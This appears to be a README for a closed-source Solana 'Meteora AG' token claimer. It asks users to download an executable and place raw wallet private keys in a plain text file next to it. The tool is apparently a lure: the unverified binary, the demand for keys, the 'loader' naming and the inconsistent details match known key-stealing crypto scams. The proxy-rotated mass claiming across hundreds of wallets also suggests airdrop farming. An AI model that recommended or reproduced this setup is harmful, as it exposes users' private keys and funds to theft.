# METEORA AG — Solana Token Claimer & Wallet Manager

![meteora](assets/image.png)

A private Solana automation tool built for the **Meteora AG** ecosystem.  
This loader is designed to **claim, consolidate, and optionally sell tokens** from multiple Solana wallets in a single automated flow.  
It is intended **only for your own wallets** and compliant, legitimate use.

---

## 🔹 Overview

This tool simplifies bulk token operations on Solana for projects like **Meteora AG**, where many wallets are eligible for claim or need token consolidation.  
It supports multi-wallet claiming, automatic balance collection, and optional auto-sell via DEX routers.

> ⚠️ Use responsibly.  
> The tool is meant **only for personal wallet automation**.  
> Never use it on wallets you do not own.

---

## ✳️ Key Features

- **Mass Claimer** — claim Meteora AG tokens from multiple Solana wallets automatically.  
- **Auto-Collect (Merge)** — send all SPL tokens from multiple wallets into one main account.  
- **Auto-Sell** — optional auto-swap of claimed tokens (e.g., to USDC) through a Solana DEX.  
- **Proxy Support** — integrates proxy rotation for distributed requests.  
- **Smart Rate Control** — concurrency and delay tuning to prevent RPC bans.  
- **Gas (SOL) Management** — maintains minimum SOL balance per wallet.  
- **Retry & Logging System** — retry failed claims and generate detailed logs.  
- **Dry-Run Simulation** — test configurations safely without broadcasting transactions.  
- **Result Reports** — per-wallet summaries and `results.csv` export.

---

## ⚙️ Install & Run

1. ✅ **Download the latest release** from the [Releases](../../releases) page.  
2. 📁 **Extract files** into a secure local folder.  
3. 🟢 **Run loader:**  
   - Double-click `meteoraclaim.exe`, or  
   - Use command line for advanced parameters.  
4. 🧩 **Prepare required files** (see below).  
5. 🚀 **Launch and monitor the process** through logs and the results file.

---

## 📄 Required Files

Place these files in the same directory as `meteoraclaim.exe`:

### `wallets.txt`
List of private Solana keys (Base58). One per line.
```

5KJvsngHeMpjpQ5YTLf2q9BtJ3BffgdzF2pS7d4wb4zPf7AqZZ1
3N5zWnM7HjRqzdAMQxLxRaCKdmbEGa7swJ8PbqzMgzNM

```

### `proxy.txt`
(Optionally) list of proxies — one per line:
```

socks5://127.0.0.1:9050
[http://user:pass@proxy.example.com:8080](http://user:pass@proxy.example.com:8080)

```

### `recipients.txt`
Destination addresses for consolidation (usually one master wallet):
```

FsGtBqYh4ubT1pnA2x2qeeZrJjYDPtSaEZVtFoZkWZkV

````

### `config.json`
Advanced configuration for claim, merge, and sell flows.  
See example below.

---

## 🧠 Example `config.json`

```json
{
  "chain": "solana",
  "network": "mainnet-beta",
  "mode": "claim+collect",
  "rpc_endpoint": "https://api.mainnet-beta.solana.com",
  "concurrency": 4,
  "delay_between_wallets_ms": 700,
  "min_sol_balance": "0.02",
  "post_action": "sell",
  "sell": {
    "dex": "meteora",
    "target_token": "USDC",
    "min_amount": 5,
    "slippage_percent": 1.0
  },
  "logging": {
    "verbose": true,
    "csv_output": "results.csv"
  }
}
````

---

## 🚀 CLI Usage Examples

### Run GUI mode

```
loader.exe
```

### Mass claim only

```
meteoraclaim.exe --mode claim
```

### Claim + consolidate tokens

```
meteoraclaim.exe --mode claim+collect
```

### Claim + auto-sell via Meteora DEX

```
meteoraclaim.exe --mode claim+sell
```

### Dry-run (simulation)

```
meteoraclaim.exe --mode claim --dry-run
```

---

## 🔁 Typical Workflows

### 🪙 1. Claim Only

Automate claim for all wallets listed in `wallets.txt`.

### 💎 2. Claim + Collect

Claim tokens → automatically send them to one master wallet
(as defined in `recipients.txt`).

### 💰 3. Claim + Sell

Claim tokens → immediately swap them to USDC (or target token) via Meteora DEX.

### 🧩 4. Collect Only

Consolidate all token balances from secondary wallets into a main one.

---

## ⚡️ Configuration Notes

| Setting                    | Description                                                              |
| -------------------------- | ------------------------------------------------------------------------ |
| `mode`                     | Selects flow (`claim`, `collect`, `sell`, `claim+collect`, `claim+sell`) |
| `rpc_endpoint`             | Solana RPC URL                                                           |
| `concurrency`              | How many wallets process in parallel                                     |
| `delay_between_wallets_ms` | Delay to avoid rate limits                                               |
| `min_sol_balance`          | Minimum SOL to keep for transaction fees                                 |
| `post_action`              | What to do after claim (`none`, `collect`, `sell`)                       |
| `slippage_percent`         | Allowed slippage for swaps                                               |
| `verbose`                  | Enables detailed console & file logs                                     |

---

## 🧾 Output Files

* `results.csv` — per-wallet success/failure summary with TX hashes.
* `loader.log` — runtime log with timestamps and debug data.
* `failed.txt` — wallets that failed processing (for manual retry).

---

## 🧠 Best Practices

1. **Use your own wallets only.**
2. **Backup your keys** and store them encrypted.
3. **Run a dry-run first** to ensure config correctness.
4. **Never share `wallets.txt`** or config files containing keys.
5. **Test on Solana devnet** before running on mainnet.
6. **Keep minimal SOL balance** in each wallet to cover gas.
7. **Rotate proxies** if processing hundreds of wallets.

---

## 🧩 Troubleshooting

| Issue              | Possible Cause     | Fix                                           |
| ------------------ | ------------------ | --------------------------------------------- |
| RPC Timeout        | Endpoint overload  | Use different Solana RPC or lower concurrency |
| “Insufficient SOL” | Low gas balance    | Send small SOL amount to wallets              |
| Token not claimed  | Drop window closed | Verify drop availability manually             |
| Swap failed        | DEX slippage       | Increase `slippage_percent` slightly          |
| Stuck transactions | Rate-limiting      | Add more delay between wallets                |

---

## ⚖️ Legal & Ethical Notice

This script is a **personal automation tool** for claiming and managing tokens in the **Meteora AG Solana ecosystem**.
It is not affiliated with or endorsed by Meteora AG.
Use it only for your own wallets and in compliance with network and platform terms.
The author (you) are solely responsible for how it is used.

---

## 🧰 Changelog

* **v1.0** — Initial Solana release: mass claim, collect, sell, proxy support.
* **v1.1** — Added CSV reports, retry logic, dry-run mode.
* **v1.2** — Refined Meteora DEX sell integration and error handling.

---

## 💬 Credits

Developed privately for managing **personal Solana wallets** during the **Meteora AG** claim cycle.
